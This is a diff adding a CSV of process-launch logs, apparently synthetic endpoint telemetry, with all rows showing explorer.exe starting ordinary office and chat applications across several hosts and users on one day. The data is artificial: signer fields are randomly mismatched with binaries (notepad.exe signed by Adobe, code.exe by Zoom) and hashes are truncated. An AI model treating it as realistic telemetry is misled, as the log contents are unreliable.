@@ -1,0 +1,305 @@
+timestamp,host,user,parent_process,process_name,command_line,hash,signature
+2026-07-30 07:00:00,SALES-PC-002,daniel.thomas,explorer.exe,code.exe,code.exe,ea83bf00,Zoom Video Communications
+2026-07-30 07:02:00,DC-SERVER-01,ava.jackson,explorer.exe,slack.exe,slack.exe,a2814044,Slack Technologies
+2026-07-30 07:04:00,HR-PC-008,sophia.anderson,explorer.exe,onedrive.exe,onedrive.exe,6889803e,Zoom Video Communications
+2026-07-30 07:06:00,ENG-PC-019,sarah.williams,explorer.exe,teams.exe,teams.exe,546e035a,Slack Technologies
+2026-07-30 07:08:00,SALES-PC-002,david.wilson,explorer.exe,slack.exe,slack.exe,d045dd1c,Adobe Inc.
+2026-07-30 07:10:00,FIN-PC-023,sophia.anderson,explorer.exe,outlook.exe,outlook.exe,50843242,Zoom Video Communications
+2026-07-30 07:12:00,ENG-PC-019,sarah.williams,explorer.exe,slack.exe,slack.exe,dd6ac7b8,Adobe Inc.
+2026-07-30 07:14:00,FIN-PC-023,daniel.thomas,explorer.exe,code.exe,code.exe,69ca97d2,Microsoft
+2026-07-30 07:16:00,FIN-PC-011,daniel.thomas,explorer.exe,onedrive.exe,onedrive.exe,9f64eeed,Slack Technologies
+2026-07-30 07:18:00,SALES-PC-002,john.smith,explorer.exe,excel.exe,excel.exe,445dcc38,Adobe Inc.
+2026-07-30 07:20:00,DC-SERVER-01,david.wilson,explorer.exe,code.exe,code.exe,e17f29e1,Slack Technologies
+2026-07-30 07:22:00,HR-PC-008,john.smith,explorer.exe,acrobat.exe,acrobat.exe,cc9fd334,Google LLC
+2026-07-30 07:24:00,DC-SERVER-01,david.wilson,explorer.exe,notepad.exe,notepad.exe,03802b70,Adobe Inc.
+2026-07-30 07:26:00,VPN-GW-01,sarah.williams,explorer.exe,excel.exe,excel.exe,fe049059,Microsoft
+2026-07-30 07:28:00,SALES-PC-002,sarah.williams,explorer.exe,teams.exe,teams.exe,7f95897c,Zoom Video Communications
+2026-07-30 07:30:00,LEGAL-PC-006,david.wilson,explorer.exe,slack.exe,slack.exe,d5b077e0,Slack Technologies
+2026-07-30 07:32:00,SALES-PC-002,emily.davis,explorer.exe,code.exe,code.exe,8d1fb540,Google LLC
+2026-07-30 07:34:00,VPN-GW-01,emily.davis,explorer.exe,acrobat.exe,acrobat.exe,821c1336,Google LLC
+2026-07-30 07:36:00,HR-PC-008,david.wilson,explorer.exe,slack.exe,slack.exe,57021049,Adobe Inc.
+2026-07-30 07:38:00,IT-PC-004,john.smith,explorer.exe,explorer.exe,explorer.exe,b9de7a3a,Zoom Video Communications
+2026-07-30 07:40:00,FILE-SERVER-02,ava.jackson,explorer.exe,code.exe,code.exe,dd81b7f5,Google LLC
+2026-07-30 07:42:00,SALES-PC-002,daniel.thomas,explorer.exe,code.exe,code.exe,585a0afa,Zoom Video Communications
+2026-07-30 07:44:00,LEGAL-PC-006,daniel.thomas,explorer.exe,slack.exe,slack.exe,749176f4,Zoom Video Communications
+2026-07-30 07:46:00,FIN-PC-011,emily.davis,explorer.exe,acrobat.exe,acrobat.exe,620a60ac,Google LLC
+2026-07-30 07:48:00,VPN-GW-01,john.smith,explorer.exe,onedrive.exe,onedrive.exe,bea4ff31,Slack Technologies
+2026-07-30 07:50:00,VPN-GW-01,james.taylor,explorer.exe,teams.exe,teams.exe,7ecddbaf,Microsoft
+2026-07-30 07:52:00,DC-SERVER-01,daniel.thomas,explorer.exe,acrobat.exe,acrobat.exe,54fd9ad3,Microsoft
+2026-07-30 07:54:00,SALES-PC-002,sarah.williams,explorer.exe,notepad.exe,notepad.exe,e912b4bf,Slack Technologies
+2026-07-30 07:56:00,FIN-PC-023,michael.brown,explorer.exe,slack.exe,slack.exe,def57689,Google LLC
+2026-07-30 07:58:00,HR-PC-008,sophia.anderson,explorer.exe,explorer.exe,explorer.exe,56abf2f1,Adobe Inc.
+2026-07-30 08:00:00,VPN-GW-01,sarah.williams,explorer.exe,onedrive.exe,onedrive.exe,da330aa1,Adobe Inc.
+2026-07-30 08:02:00,VPN-GW-01,olivia.moore,explorer.exe,code.exe,code.exe,df547e50,Adobe Inc.
+2026-07-30 08:04:00,FIN-PC-023,ava.jackson,explorer.exe,outlook.exe,outlook.exe,3c19e71d,Zoom Video Communications
+2026-07-30 08:06:00,FIN-PC-011,sarah.williams,explorer.exe,slack.exe,slack.exe,fa745761,Microsoft
+2026-07-30 08:08:00,HR-PC-008,sophia.anderson,explorer.exe,teams.exe,teams.exe,b1aa0f6a,Zoom Video Communications
+2026-07-30 08:10:00,FIN-PC-023,john.smith,explorer.exe,onedrive.exe,onedrive.exe,cbd00ef2,Microsoft
+2026-07-30 08:12:00,IT-PC-004,olivia.moore,explorer.exe,onedrive.exe,onedrive.exe,6e417d47,Google LLC
+2026-07-30 08:14:00,FIN-PC-011,daniel.thomas,explorer.exe,slack.exe,slack.exe,90e0a95b,Google LLC
+2026-07-30 08:16:00,DC-SERVER-01,michael.brown,explorer.exe,outlook.exe,outlook.exe,9c07a751,Slack Technologies
+2026-07-30 08:18:00,FILE-SERVER-02,emily.davis,explorer.exe,code.exe,code.exe,e9af299d,Adobe Inc.
+2026-07-30 08:20:00,DC-SERVER-01,emily.davis,explorer.exe,code.exe,code.exe,a34db7c5,Zoom Video Communications
+2026-07-30 08:22:00,SALES-PC-002,david.wilson,explorer.exe,chrome.exe,chrome.exe,e61ede90,Slack Technologies
+2026-07-30 08:24:00,IT-PC-004,daniel.thomas,explorer.exe,teams.exe,teams.exe,12e89d10,Slack Technologies
+2026-07-30 08:26:00,ENG-PC-019,ava.jackson,explorer.exe,explorer.exe,explorer.exe,a3917c99,Slack Technologies
+2026-07-30 08:28:00,IT-PC-004,sophia.anderson,explorer.exe,explorer.exe,explorer.exe,32ffe294,Slack Technologies
+2026-07-30 08:30:00,SALES-PC-002,sarah.williams,explorer.exe,excel.exe,excel.exe,61a11729,Adobe Inc.
+2026-07-30 08:32:00,ENG-PC-019,ava.jackson,explorer.exe,explorer.exe,explorer.exe,fe2110d0,Zoom Video Communications
+2026-07-30 08:34:00,FIN-PC-023,james.taylor,explorer.exe,explorer.exe,explorer.exe,0212b554,Adobe Inc.
+2026-07-30 08:36:00,FIN-PC-023,ava.jackson,explorer.exe,code.exe,code.exe,d534ee1d,Zoom Video Communications
+2026-07-30 08:38:00,FIN-PC-011,ava.jackson,explorer.exe,onedrive.exe,onedrive.exe,3810ae66,Google LLC
+2026-07-30 08:40:00,FILE-SERVER-02,david.wilson,explorer.exe,teams.exe,teams.exe,a0d4de3d,Microsoft
+2026-07-30 08:42:00,FIN-PC-023,david.wilson,explorer.exe,code.exe,code.exe,088a93ec,Adobe Inc.
+2026-07-30 08:44:00,ENG-PC-019,michael.brown,explorer.exe,outlook.exe,outlook.exe,e8dd5e5a,Zoom Video Communications
+2026-07-30 08:46:00,ENG-PC-019,james.taylor,explorer.exe,teams.exe,teams.exe,336749b5,Google LLC
+2026-07-30 08:48:00,LEGAL-PC-006,olivia.moore,explorer.exe,notepad.exe,notepad.exe,80759f1f,Zoom Video Communications
+2026-07-30 08:50:00,DC-SERVER-01,david.wilson,explorer.exe,code.exe,code.exe,f7a67b94,Zoom Video Communications
+2026-07-30 08:52:00,ENG-PC-019,sarah.williams,explorer.exe,code.exe,code.exe,f6802cdb,Microsoft
+2026-07-30 08:54:00,DC-SERVER-01,emily.davis,explorer.exe,slack.exe,slack.exe,f79efd70,Adobe Inc.
+2026-07-30 08:56:00,ENG-PC-019,sarah.williams,explorer.exe,slack.exe,slack.exe,03902c5d,Zoom Video Communications
+2026-07-30 08:58:00,LEGAL-PC-006,sarah.williams,explorer.exe,code.exe,code.exe,5e5ba13d,Zoom Video Communications
+2026-07-30 09:00:00,FILE-SERVER-02,james.taylor,explorer.exe,onedrive.exe,onedrive.exe,1bbc91f7,Google LLC
+2026-07-30 09:02:00,SALES-PC-002,john.smith,explorer.exe,acrobat.exe,acrobat.exe,e25d36eb,Adobe Inc.
+2026-07-30 09:04:00,ENG-PC-019,ava.jackson,explorer.exe,excel.exe,excel.exe,a5cc8bf7,Microsoft
+2026-07-30 09:06:00,SALES-PC-002,david.wilson,explorer.exe,slack.exe,slack.exe,1dde7969,Google LLC
+2026-07-30 09:08:00,FIN-PC-023,john.smith,explorer.exe,explorer.exe,explorer.exe,fef518a6,Slack Technologies
+2026-07-30 09:10:00,HR-PC-008,sarah.williams,explorer.exe,excel.exe,excel.exe,e3236d1a,Adobe Inc.
+2026-07-30 09:12:00,DC-SERVER-01,james.taylor,explorer.exe,code.exe,code.exe,5efa9c5b,Adobe Inc.
+2026-07-30 09:14:00,VPN-GW-01,ava.jackson,explorer.exe,teams.exe,teams.exe,e2aa7a5d,Slack Technologies
+2026-07-30 09:16:00,HR-PC-008,sophia.anderson,explorer.exe,acrobat.exe,acrobat.exe,687a4850,Zoom Video Communications
+2026-07-30 09:18:00,FIN-PC-023,olivia.moore,explorer.exe,excel.exe,excel.exe,71818dcf,Slack Technologies
+2026-07-30 09:20:00,FIN-PC-011,olivia.moore,explorer.exe,outlook.exe,outlook.exe,fb1e143b,Zoom Video Communications
+2026-07-30 09:22:00,LEGAL-PC-006,olivia.moore,explorer.exe,chrome.exe,chrome.exe,65ec7acd,Zoom Video Communications
+2026-07-30 09:24:00,FIN-PC-011,sarah.williams,explorer.exe,code.exe,code.exe,1777e8cb,Google LLC
+2026-07-30 09:26:00,FILE-SERVER-02,john.smith,explorer.exe,chrome.exe,chrome.exe,c96b5edb,Zoom Video Communications
+2026-07-30 09:28:00,FIN-PC-011,michael.brown,explorer.exe,acrobat.exe,acrobat.exe,34885a46,Microsoft
+2026-07-30 09:30:00,LEGAL-PC-006,emily.davis,explorer.exe,acrobat.exe,acrobat.exe,3748967f,Google LLC
+2026-07-30 09:32:00,ENG-PC-019,michael.brown,explorer.exe,acrobat.exe,acrobat.exe,00b9d4a3,Zoom Video Communications
+2026-07-30 09:34:00,DC-SERVER-01,michael.brown,explorer.exe,notepad.exe,notepad.exe,402adf9c,Google LLC
+2026-07-30 09:36:00,HR-PC-008,john.smith,explorer.exe,teams.exe,teams.exe,03cde2e3,Zoom Video Communications
+2026-07-30 09:38:00,FIN-PC-011,ava.jackson,explorer.exe,onedrive.exe,onedrive.exe,040a3aae,Google LLC
+2026-07-30 09:40:00,IT-PC-004,john.smith,explorer.exe,teams.exe,teams.exe,bde13c1b,Slack Technologies
+2026-07-30 09:42:00,LEGAL-PC-006,sarah.williams,explorer.exe,outlook.exe,outlook.exe,79eb4168,Slack Technologies
+2026-07-30 09:44:00,ENG-PC-019,daniel.thomas,explorer.exe,acrobat.exe,acrobat.exe,1beaf6ac,Slack Technologies
+2026-07-30 09:46:00,LEGAL-PC-006,emily.davis,explorer.exe,acrobat.exe,acrobat.exe,0b19f88e,Adobe Inc.
+2026-07-30 09:48:00,IT-PC-004,sophia.anderson,explorer.exe,chrome.exe,chrome.exe,0f9240e1,Slack Technologies
+2026-07-30 09:50:00,VPN-GW-01,james.taylor,explorer.exe,outlook.exe,outlook.exe,7d824264,Slack Technologies
+2026-07-30 09:52:00,HR-PC-008,sarah.williams,explorer.exe,onedrive.exe,onedrive.exe,9bb96155,Google LLC
+2026-07-30 09:54:00,HR-PC-008,michael.brown,explorer.exe,explorer.exe,explorer.exe,9fd34579,Adobe Inc.
+2026-07-30 09:56:00,LEGAL-PC-006,olivia.moore,explorer.exe,slack.exe,slack.exe,fe9fecaa,Adobe Inc.
+2026-07-30 09:58:00,LEGAL-PC-006,david.wilson,explorer.exe,code.exe,code.exe,816bcb9f,Adobe Inc.
+2026-07-30 10:00:00,VPN-GW-01,sarah.williams,explorer.exe,outlook.exe,outlook.exe,da509fed,Adobe Inc.
+2026-07-30 10:02:00,FIN-PC-011,james.taylor,explorer.exe,code.exe,code.exe,e359eee1,Google LLC
+2026-07-30 10:04:00,VPN-GW-01,olivia.moore,explorer.exe,code.exe,code.exe,66132e69,Slack Technologies
+2026-07-30 10:06:00,HR-PC-008,olivia.moore,explorer.exe,slack.exe,slack.exe,50018b7b,Zoom Video Communications
+2026-07-30 10:08:00,ENG-PC-019,michael.brown,explorer.exe,code.exe,code.exe,112fa612,Microsoft
+2026-07-30 10:10:00,HR-PC-008,sarah.williams,explorer.exe,slack.exe,slack.exe,18b87245,Zoom Video Communications
+2026-07-30 10:12:00,DC-SERVER-01,daniel.thomas,explorer.exe,chrome.exe,chrome.exe,96229348,Adobe Inc.
+2026-07-30 10:14:00,LEGAL-PC-006,olivia.moore,explorer.exe,outlook.exe,outlook.exe,692ac139,Zoom Video Communications
+2026-07-30 10:16:00,VPN-GW-01,john.smith,explorer.exe,explorer.exe,explorer.exe,99b479d4,Zoom Video Communications
+2026-07-30 10:18:00,ENG-PC-019,sarah.williams,explorer.exe,acrobat.exe,acrobat.exe,81e5c9f6,Google LLC
+2026-07-30 10:20:00,DC-SERVER-01,sophia.anderson,explorer.exe,excel.exe,excel.exe,d8e7012f,Microsoft
+2026-07-30 10:22:00,ENG-PC-019,daniel.thomas,explorer.exe,onedrive.exe,onedrive.exe,1d691fba,Zoom Video Communications
+2026-07-30 10:24:00,FILE-SERVER-02,emily.davis,explorer.exe,slack.exe,slack.exe,d85c16bd,Adobe Inc.
+2026-07-30 10:26:00,FILE-SERVER-02,ava.jackson,explorer.exe,notepad.exe,notepad.exe,06b89231,Adobe Inc.
+2026-07-30 10:28:00,IT-PC-004,john.smith,explorer.exe,teams.exe,teams.exe,45f50c52,Zoom Video Communications
+2026-07-30 10:30:00,ENG-PC-019,olivia.moore,explorer.exe,chrome.exe,chrome.exe,2e709838,Google LLC
+2026-07-30 10:32:00,FILE-SERVER-02,james.taylor,explorer.exe,outlook.exe,outlook.exe,2451e5a4,Microsoft
+2026-07-30 10:34:00,HR-PC-008,daniel.thomas,explorer.exe,excel.exe,excel.exe,604e46cb,Slack Technologies
+2026-07-30 10:36:00,SALES-PC-002,olivia.moore,explorer.exe,teams.exe,teams.exe,5ebbcca5,Zoom Video Communications
+2026-07-30 10:38:00,ENG-PC-019,ava.jackson,explorer.exe,acrobat.exe,acrobat.exe,15bfbe97,Microsoft
+2026-07-30 10:40:00,DC-SERVER-01,michael.brown,explorer.exe,acrobat.exe,acrobat.exe,0cbd3c03,Microsoft
+2026-07-30 10:42:00,IT-PC-004,sophia.anderson,explorer.exe,slack.exe,slack.exe,7c54535f,Adobe Inc.
+2026-07-30 10:44:00,SALES-PC-002,james.taylor,explorer.exe,explorer.exe,explorer.exe,372f871a,Adobe Inc.
+2026-07-30 10:46:00,HR-PC-008,olivia.moore,explorer.exe,slack.exe,slack.exe,1c6345ab,Zoom Video Communications
+2026-07-30 10:48:00,FILE-SERVER-02,sophia.anderson,explorer.exe,notepad.exe,notepad.exe,aac93316,Zoom Video Communications
+2026-07-30 10:50:00,FIN-PC-023,emily.davis,explorer.exe,slack.exe,slack.exe,fc04a168,Adobe Inc.
+2026-07-30 10:52:00,FIN-PC-023,john.smith,explorer.exe,excel.exe,excel.exe,4d29d1ab,Google LLC
+2026-07-30 10:54:00,DC-SERVER-01,david.wilson,explorer.exe,explorer.exe,explorer.exe,53ffd3a2,Microsoft
+2026-07-30 10:56:00,FIN-PC-023,sophia.anderson,explorer.exe,slack.exe,slack.exe,2cfa55b0,Google LLC
+2026-07-30 10:58:00,VPN-GW-01,daniel.thomas,explorer.exe,excel.exe,excel.exe,8011316b,Adobe Inc.
+2026-07-30 11:00:00,ENG-PC-019,sarah.williams,explorer.exe,slack.exe,slack.exe,dc9c96de,Microsoft
+2026-07-30 11:02:00,VPN-GW-01,john.smith,explorer.exe,code.exe,code.exe,ebd14d2c,Microsoft
+2026-07-30 11:04:00,ENG-PC-019,ava.jackson,explorer.exe,slack.exe,slack.exe,92ca525a,Slack Technologies
+2026-07-30 11:06:00,VPN-GW-01,david.wilson,explorer.exe,outlook.exe,outlook.exe,67b03283,Microsoft
+2026-07-30 11:08:00,ENG-PC-019,michael.brown,explorer.exe,acrobat.exe,acrobat.exe,75c8e90d,Zoom Video Communications
+2026-07-30 11:10:00,HR-PC-008,james.taylor,explorer.exe,outlook.exe,outlook.exe,3e49fd09,Slack Technologies
+2026-07-30 11:12:00,FILE-SERVER-02,james.taylor,explorer.exe,notepad.exe,notepad.exe,1422373f,Slack Technologies
+2026-07-30 11:14:00,IT-PC-004,olivia.moore,explorer.exe,excel.exe,excel.exe,5543fc3c,Google LLC
+2026-07-30 11:16:00,HR-PC-008,daniel.thomas,explorer.exe,outlook.exe,outlook.exe,87d5b7be,Adobe Inc.
+2026-07-30 11:18:00,FIN-PC-011,olivia.moore,explorer.exe,onedrive.exe,onedrive.exe,ba35844e,Google LLC
+2026-07-30 11:20:00,FIN-PC-011,sarah.williams,explorer.exe,teams.exe,teams.exe,4187222b,Google LLC
+2026-07-30 11:22:00,DC-SERVER-01,ava.jackson,explorer.exe,teams.exe,teams.exe,c29d782b,Microsoft
+2026-07-30 11:24:00,DC-SERVER-01,sophia.anderson,explorer.exe,code.exe,code.exe,c1235c91,Adobe Inc.
+2026-07-30 11:26:00,FILE-SERVER-02,sophia.anderson,explorer.exe,acrobat.exe,acrobat.exe,a49b1cd9,Adobe Inc.
+2026-07-30 11:28:00,ENG-PC-019,olivia.moore,explorer.exe,teams.exe,teams.exe,70944bdb,Microsoft
+2026-07-30 11:30:00,SALES-PC-002,sophia.anderson,explorer.exe,explorer.exe,explorer.exe,cbdc4318,Zoom Video Communications
+2026-07-30 11:32:00,FILE-SERVER-02,john.smith,explorer.exe,onedrive.exe,onedrive.exe,81e0d489,Microsoft
+2026-07-30 11:34:00,IT-PC-004,sophia.anderson,explorer.exe,code.exe,code.exe,09a0a0f6,Microsoft
+2026-07-30 11:36:00,ENG-PC-019,david.wilson,explorer.exe,outlook.exe,outlook.exe,a508dc95,Microsoft
+2026-07-30 11:38:00,FILE-SERVER-02,ava.jackson,explorer.exe,notepad.exe,notepad.exe,626d719d,Slack Technologies
+2026-07-30 11:40:00,FILE-SERVER-02,daniel.thomas,explorer.exe,chrome.exe,chrome.exe,7321bf6b,Adobe Inc.
+2026-07-30 11:42:00,FIN-PC-011,olivia.moore,explorer.exe,acrobat.exe,acrobat.exe,79c2d2e4,Adobe Inc.
+2026-07-30 11:44:00,DC-SERVER-01,john.smith,explorer.exe,code.exe,code.exe,1a7f195b,Zoom Video Communications
+2026-07-30 11:46:00,HR-PC-008,daniel.thomas,explorer.exe,teams.exe,teams.exe,0a0537f0,Google LLC
+2026-07-30 11:48:00,SALES-PC-002,sophia.anderson,explorer.exe,notepad.exe,notepad.exe,85d2d0a6,Adobe Inc.
+2026-07-30 11:50:00,DC-SERVER-01,olivia.moore,explorer.exe,onedrive.exe,onedrive.exe,eafde7d9,Zoom Video Communications
+2026-07-30 11:52:00,VPN-GW-01,james.taylor,explorer.exe,onedrive.exe,onedrive.exe,adcc3daf,Adobe Inc.
+2026-07-30 11:54:00,FIN-PC-023,olivia.moore,explorer.exe,outlook.exe,outlook.exe,54669d19,Microsoft
+2026-07-30 11:56:00,LEGAL-PC-006,james.taylor,explorer.exe,explorer.exe,explorer.exe,4082cbb9,Adobe Inc.
+2026-07-30 11:58:00,DC-SERVER-01,olivia.moore,explorer.exe,outlook.exe,outlook.exe,952e6abb,Google LLC
+2026-07-30 12:00:00,ENG-PC-019,david.wilson,explorer.exe,slack.exe,slack.exe,2102f9c9,Adobe Inc.
+2026-07-30 12:02:00,HR-PC-008,david.wilson,explorer.exe,notepad.exe,notepad.exe,606e0e1c,Zoom Video Communications
+2026-07-30 12:04:00,DC-SERVER-01,daniel.thomas,explorer.exe,outlook.exe,outlook.exe,a561e1e9,Slack Technologies
+2026-07-30 12:06:00,LEGAL-PC-006,olivia.moore,explorer.exe,chrome.exe,chrome.exe,5cd33369,Zoom Video Communications
+2026-07-30 12:08:00,DC-SERVER-01,emily.davis,explorer.exe,onedrive.exe,onedrive.exe,f29a6339,Slack Technologies
+2026-07-30 12:10:00,FIN-PC-011,emily.davis,explorer.exe,teams.exe,teams.exe,27aa7cbc,Microsoft
+2026-07-30 12:12:00,IT-PC-004,sarah.williams,explorer.exe,notepad.exe,notepad.exe,c5580bb2,Adobe Inc.
+2026-07-30 12:14:00,LEGAL-PC-006,john.smith,explorer.exe,onedrive.exe,onedrive.exe,e05b46c5,Adobe Inc.
+2026-07-30 12:16:00,DC-SERVER-01,ava.jackson,explorer.exe,slack.exe,slack.exe,277d1be9,Google LLC
+2026-07-30 12:18:00,DC-SERVER-01,ava.jackson,explorer.exe,teams.exe,teams.exe,b89f72f3,Slack Technologies
+2026-07-30 12:20:00,FIN-PC-023,james.taylor,explorer.exe,onedrive.exe,onedrive.exe,ad261ec5,Google LLC
+2026-07-30 12:22:00,SALES-PC-002,ava.jackson,explorer.exe,explorer.exe,explorer.exe,c09cb506,Slack Technologies
+2026-07-30 12:24:00,FIN-PC-011,daniel.thomas,explorer.exe,excel.exe,excel.exe,4f3949a8,Slack Technologies
+2026-07-30 12:26:00,FIN-PC-011,olivia.moore,explorer.exe,acrobat.exe,acrobat.exe,fc043f08,Slack Technologies
+2026-07-30 12:28:00,SALES-PC-002,david.wilson,explorer.exe,slack.exe,slack.exe,80be7e35,Adobe Inc.
+2026-07-30 12:30:00,VPN-GW-01,michael.brown,explorer.exe,excel.exe,excel.exe,cd1f5318,Adobe Inc.
+2026-07-30 12:32:00,DC-SERVER-01,david.wilson,explorer.exe,chrome.exe,chrome.exe,a4244f23,Slack Technologies
+2026-07-30 12:34:00,ENG-PC-019,daniel.thomas,explorer.exe,outlook.exe,outlook.exe,b61e5fdb,Adobe Inc.
+2026-07-30 12:36:00,HR-PC-008,david.wilson,explorer.exe,outlook.exe,outlook.exe,c35b9fea,Google LLC
+2026-07-30 12:38:00,IT-PC-004,sophia.anderson,explorer.exe,notepad.exe,notepad.exe,25b8a42f,Slack Technologies
+2026-07-30 12:40:00,HR-PC-008,emily.davis,explorer.exe,code.exe,code.exe,e27718c5,Zoom Video Communications
+2026-07-30 12:42:00,FIN-PC-023,james.taylor,explorer.exe,chrome.exe,chrome.exe,657e01c9,Adobe Inc.
+2026-07-30 12:44:00,ENG-PC-019,emily.davis,explorer.exe,slack.exe,slack.exe,fe9936a3,Microsoft
+2026-07-30 12:46:00,ENG-PC-019,emily.davis,explorer.exe,chrome.exe,chrome.exe,519554e3,Microsoft
+2026-07-30 12:48:00,ENG-PC-019,michael.brown,explorer.exe,teams.exe,teams.exe,09ce3cfb,Zoom Video Communications
+2026-07-30 12:50:00,SALES-PC-002,michael.brown,explorer.exe,code.exe,code.exe,72d78bdd,Adobe Inc.
+2026-07-30 12:52:00,FIN-PC-023,sarah.williams,explorer.exe,chrome.exe,chrome.exe,41843b03,Google LLC
+2026-07-30 12:54:00,DC-SERVER-01,daniel.thomas,explorer.exe,acrobat.exe,acrobat.exe,871c0884,Slack Technologies
+2026-07-30 12:56:00,HR-PC-008,david.wilson,explorer.exe,excel.exe,excel.exe,4d183eba,Microsoft
+2026-07-30 12:58:00,FIN-PC-023,emily.davis,explorer.exe,slack.exe,slack.exe,a3925731,Adobe Inc.
+2026-07-30 13:00:00,SALES-PC-002,sarah.williams,explorer.exe,outlook.exe,outlook.exe,d6312a80,Slack Technologies
+2026-07-30 13:02:00,FILE-SERVER-02,daniel.thomas,explorer.exe,chrome.exe,chrome.exe,a1c7cc8a,Adobe Inc.
+2026-07-30 13:04:00,FILE-SERVER-02,emily.davis,explorer.exe,teams.exe,teams.exe,4a90cd0c,Slack Technologies
+2026-07-30 13:06:00,FIN-PC-023,ava.jackson,explorer.exe,onedrive.exe,onedrive.exe,3d959e3f,Adobe Inc.
+2026-07-30 13:08:00,VPN-GW-01,michael.brown,explorer.exe,outlook.exe,outlook.exe,8603156a,Zoom Video Communications
+2026-07-30 13:10:00,HR-PC-008,daniel.thomas,explorer.exe,notepad.exe,notepad.exe,81e03a5e,Adobe Inc.
+2026-07-30 13:12:00,LEGAL-PC-006,john.smith,explorer.exe,slack.exe,slack.exe,df92a621,Slack Technologies
+2026-07-30 13:14:00,FIN-PC-023,james.taylor,explorer.exe,onedrive.exe,onedrive.exe,40ef3935,Microsoft
+2026-07-30 13:16:00,ENG-PC-019,sarah.williams,explorer.exe,onedrive.exe,onedrive.exe,3dba6da8,Microsoft
+2026-07-30 13:18:00,FILE-SERVER-02,olivia.moore,explorer.exe,teams.exe,teams.exe,0b599562,Zoom Video Communications
+2026-07-30 13:20:00,LEGAL-PC-006,olivia.moore,explorer.exe,teams.exe,teams.exe,d49405f0,Slack Technologies
+2026-07-30 13:22:00,SALES-PC-002,michael.brown,explorer.exe,teams.exe,teams.exe,10275b53,Slack Technologies
+2026-07-30 13:24:00,FIN-PC-023,david.wilson,explorer.exe,excel.exe,excel.exe,0b36e356,Google LLC
+2026-07-30 13:26:00,FIN-PC-023,olivia.moore,explorer.exe,explorer.exe,explorer.exe,83f02dc7,Slack Technologies
+2026-07-30 13:28:00,LEGAL-PC-006,sophia.anderson,explorer.exe,explorer.exe,explorer.exe,095ffa81,Google LLC
+2026-07-30 13:30:00,IT-PC-004,olivia.moore,explorer.exe,chrome.exe,chrome.exe,dda4f4a7,Zoom Video Communications
+2026-07-30 13:32:00,IT-PC-004,sarah.williams,explorer.exe,onedrive.exe,onedrive.exe,6fdc0bad,Slack Technologies
+2026-07-30 13:34:00,SALES-PC-002,james.taylor,explorer.exe,onedrive.exe,onedrive.exe,f945f2fd,Google LLC
+2026-07-30 13:36:00,SALES-PC-002,sophia.anderson,explorer.exe,onedrive.exe,onedrive.exe,ec9f9c54,Adobe Inc.
+2026-07-30 13:38:00,IT-PC-004,sarah.williams,explorer.exe,slack.exe,slack.exe,14348f62,Slack Technologies
+2026-07-30 13:40:00,FILE-SERVER-02,michael.brown,explorer.exe,notepad.exe,notepad.exe,4b3446bc,Zoom Video Communications
+2026-07-30 13:42:00,HR-PC-008,sarah.williams,explorer.exe,onedrive.exe,onedrive.exe,a9320094,Zoom Video Communications
+2026-07-30 13:44:00,IT-PC-004,sophia.anderson,explorer.exe,acrobat.exe,acrobat.exe,b7b8c1a5,Slack Technologies
+2026-07-30 13:46:00,DC-SERVER-01,sophia.anderson,explorer.exe,onedrive.exe,onedrive.exe,727716ec,Microsoft
+2026-07-30 13:48:00,ENG-PC-019,ava.jackson,explorer.exe,slack.exe,slack.exe,46494296,Microsoft
+2026-07-30 13:50:00,HR-PC-008,james.taylor,explorer.exe,onedrive.exe,onedrive.exe,83599af6,Google LLC
+2026-07-30 13:52:00,FIN-PC-023,michael.brown,explorer.exe,acrobat.exe,acrobat.exe,ad973b67,Slack Technologies
+2026-07-30 13:54:00,FIN-PC-023,michael.brown,explorer.exe,outlook.exe,outlook.exe,3c6a3174,Zoom Video Communications
+2026-07-30 13:56:00,ENG-PC-019,james.taylor,explorer.exe,acrobat.exe,acrobat.exe,084a6780,Adobe Inc.
+2026-07-30 13:58:00,DC-SERVER-01,sophia.anderson,explorer.exe,onedrive.exe,onedrive.exe,5f3c44dc,Slack Technologies
+2026-07-30 14:00:00,HR-PC-008,ava.jackson,explorer.exe,teams.exe,teams.exe,878aaed9,Zoom Video Communications
+2026-07-30 14:02:00,VPN-GW-01,olivia.moore,explorer.exe,explorer.exe,explorer.exe,3fe68c9c,Microsoft
+2026-07-30 14:04:00,FIN-PC-023,michael.brown,explorer.exe,code.exe,code.exe,848af440,Slack Technologies
+2026-07-30 14:06:00,LEGAL-PC-006,sarah.williams,explorer.exe,explorer.exe,explorer.exe,c6641285,Zoom Video Communications
+2026-07-30 14:08:00,SALES-PC-002,emily.davis,explorer.exe,acrobat.exe,acrobat.exe,491b90e9,Slack Technologies
+2026-07-30 14:10:00,FIN-PC-011,sarah.williams,explorer.exe,teams.exe,teams.exe,da52d2ee,Microsoft
+2026-07-30 14:12:00,SALES-PC-002,michael.brown,explorer.exe,code.exe,code.exe,ff4c96d6,Microsoft
+2026-07-30 14:14:00,ENG-PC-019,olivia.moore,explorer.exe,outlook.exe,outlook.exe,8ccc9cea,Adobe Inc.
+2026-07-30 14:16:00,IT-PC-004,david.wilson,explorer.exe,teams.exe,teams.exe,b6391f04,Google LLC
+2026-07-30 14:18:00,ENG-PC-019,daniel.thomas,explorer.exe,excel.exe,excel.exe,1f119c0f,Google LLC
+2026-07-30 14:20:00,DC-SERVER-01,emily.davis,explorer.exe,code.exe,code.exe,06ba8cd3,Zoom Video Communications
+2026-07-30 14:22:00,LEGAL-PC-006,ava.jackson,explorer.exe,onedrive.exe,onedrive.exe,77a7e8b7,Adobe Inc.
+2026-07-30 14:24:00,DC-SERVER-01,ava.jackson,explorer.exe,outlook.exe,outlook.exe,10d4de39,Zoom Video Communications
+2026-07-30 14:26:00,VPN-GW-01,sophia.anderson,explorer.exe,notepad.exe,notepad.exe,6929de73,Slack Technologies
+2026-07-30 14:28:00,FILE-SERVER-02,sarah.williams,explorer.exe,teams.exe,teams.exe,f8ede0ca,Zoom Video Communications
+2026-07-30 14:30:00,HR-PC-008,sophia.anderson,explorer.exe,code.exe,code.exe,ae1b9f69,Adobe Inc.
+2026-07-30 14:32:00,ENG-PC-019,michael.brown,explorer.exe,notepad.exe,notepad.exe,a3c988e4,Adobe Inc.
+2026-07-30 14:34:00,DC-SERVER-01,michael.brown,explorer.exe,slack.exe,slack.exe,80bbae52,Microsoft
+2026-07-30 14:36:00,HR-PC-008,daniel.thomas,explorer.exe,teams.exe,teams.exe,4ddb1b36,Google LLC
+2026-07-30 14:38:00,DC-SERVER-01,olivia.moore,explorer.exe,excel.exe,excel.exe,5894f7f1,Adobe Inc.
